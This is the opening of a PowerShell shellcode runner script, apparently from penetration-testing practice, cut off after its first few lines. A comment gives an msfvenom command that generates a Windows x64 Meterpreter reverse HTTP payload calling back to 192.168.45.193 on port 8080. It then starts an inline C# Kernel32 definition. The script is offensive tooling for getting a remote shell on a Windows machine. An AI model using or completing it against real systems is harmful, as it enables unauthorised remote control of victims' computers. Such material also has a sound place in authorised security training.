#Shellcode Runner for direct execution in powershell
#Replace the buf with the output of "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.45.193 LPORT=8080 EXITFUNC=thread -f ps1"
$Kernel32 = @"
using System;
